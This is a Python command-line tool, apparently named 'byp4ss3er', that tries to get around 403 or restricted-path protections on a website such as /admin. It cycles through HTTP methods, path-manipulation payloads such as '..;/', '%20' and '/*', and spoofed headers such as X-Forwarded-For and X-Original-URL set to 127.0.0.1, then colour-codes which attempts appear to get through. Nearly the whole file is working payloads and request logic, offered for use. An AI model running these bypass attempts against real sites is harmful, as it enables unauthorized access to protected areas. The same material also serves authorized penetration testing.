
import requests
import sys
import colorama
from colorama import Fore, Back, Style
import time

colorama.init()

print("""
    __                   __ __           _____
   / /_  __  __   ____  / // / _________|__  /_____
  / __ \/ / / /  / __ \/ // /_/ ___/ ___//_ </ ___/
 / /_/ / /_/ /  / /_/ /__  __(__  |__  )__/ / /
/_.___/\__, /  / .___/  /_/ /____/____/____/_/
      /____/  /_/

       version: 1.0
       coded by (twitter: @akaSalah) 
""")
print("STARTING IN 2 SECONDS . . .")

print(Fore.GREEN,"\rIF BYPASSED ACCORDING TO THE ANALYSIS => GREEN")
print(Fore.YELLOW,"\rIF REDIRECT => YELLOW ")
print(Fore.LIGHTRED_EX,"\rIF DIDN'T BYPASS => RED\n ")


def getArgs():
    try:
        URL = sys.argv[1]
        PATH = sys.argv[2]
        return URL, PATH
    except:
        print("\n\nPlease use this format  => ./byp4ss3er http(s)://url /path \n")
        print("Example  => ./byp4ss3er http(s)://somewebsite.com /admin \n\n")
    sys.exit() # kill the program
        
def fixedHeaders(URL,PATH):
    payloads = {
            'X-Original-URL':'127.0.0.1',
            'X-Forwarded-For':'127.0.0.1',
            'X-Client-IP': '127.0.0.1',
            'Client-IP': '127.0.0.1',
            'Proxy-Host': '127.0.0.1',
            'X-Forwarded': '127.0.0.1',
            'X-Forwarded-By': '127.0.0.1',
            'X-Forwarded-For':'127.0.0.1',
            'X-Forwarded-For-Original':'127.0.0.1',
            'X-Forwarded-Host': '127.0.0.1',
            'X-Forwarded-Server': '127.0.0.1',
            'X-Forwarder-For': '127.0.0.1',
            'X-Forward-For': '127.0.0.1',
            'Referer': URL+PATH,
            'Referrer': URL+PATH,
            'X-Host': '127.0.0.1',
            'X-Original-Remote-Addr':'127.0.0.1',
            'X-Proxy-Url': '127.0.0.1',
            'X-Forwarded-Proto': '127.0.0.1',
            'X-Real-Ip': '127.0.0.1',
            'X-Remote-Addr': '127.0.0.1',
            'X-Custom-IP-Authorization':'127.0.0.1',
            'X-Originating-IP': '127.0.0.1',
    }
    
    return payloads

def dynamicHeaders(PATH):
    payloads = {   
            'X-Original-URL':PATH,
            'X-Rewrite-URL': PATH,
            'X-Override-URL': PATH
        }
    return payloads

def httpMethods():
    Methods = ['GET', 'POST', 'DELETE', 'PUT', 'OPTIONS', 'TRACE', 'TRACK']
    return Methods
def pathManipulating(PATH):
    payloads = [
        PATH+'?',
        PATH+'??',
        PATH+'&',
        PATH+'%',
        PATH+'%20',
        PATH+'%09',
        PATH+'/',
        PATH+'..;/',
        './'+PATH,
        './'+PATH+'/',
        PATH+'//',
        PATH+';/',
        PATH+'/*',
        PATH+'/.',
        PATH+'./.',
        PATH+'/./',
        PATH+'%23',
        PATH+'~',
        PATH+'/~',
        PATH+'.json',
    ]
    return payloads

def checkResponse(r):
    if r.status_code >= 200 and r.status_code <299:
        return r.status_code, Fore.GREEN

    elif r.status_code >= 300 and r.status_code <399:
        return r.status_code, Fore.YELLOW    

    elif r.status_code >= 400  and r.status_code <599:
        return r.status_code, Fore.RED

def start():

    time.sleep(2)
    URL, PATH = getArgs()
   
    print(Fore.WHITE,"\r\n####### WITH HTTP Different Methods #######")

    for method in httpMethods():
        try:
            r  = requests.request(method,URL+PATH,allow_redirects=False)
            code, color = checkResponse(r)
            print(color, method, " | ",URL+PATH, "=>   ",code )
        except:
            pass

    
    print(Fore.WHITE,"\r\n####### WITH Path Manipulating #######")
   
    for path in pathManipulating(PATH):
        try:
            r  = requests.get(URL+path,allow_redirects=False)
            code, color = checkResponse(r)
            print(color,URL+path, "=>   ",code )
        except:
            pass

    print(Fore.WHITE,"\r\n####### WITH HTTP HEADERS #######")

    for header, value in fixedHeaders(URL,PATH).items():
        try:
            getHeader = {header: value}
            r  = requests.get(URL+PATH, headers=getHeader,allow_redirects=False) 
            code, color = checkResponse(r)
            print(color,header," | ", URL+PATH, "=>   ",code )
        except:
            pass

    for header, value in dynamicHeaders(PATH).items():
        try:
            getHeader = {header : value }
            checkRequest  = requests.get(URL+"/" ) 
            r  = requests.get(URL+"/", headers=getHeader,allow_redirects=False
            )
            code, color = checkResponse(r)
            '''
            the reason we have to request 
            1- checkRequest
            and the main request
            2- r
            is because those dynamic header could return a response with 200 status code but that does not it by passed
            so we have to make request to the root page and compare, then we can check if it really by passed or not 
            proxies= {"http":"http://127.0.0.1:8080"
            ,"https":"http://127.0.0.1:8080"
            },verify=False

            '''
            if color == Fore.GREEN:
                if checkRequest.text != r.text:
                    print(color,header," | ", URL+PATH, "=>   ",code )
                else:
                    print(Fore.RED,header," | ", URL+PATH, "=>   ",code )
            else:
                print(color,header," | ", URL+PATH, "=>   ",code )
        except:
            pass
    

start()
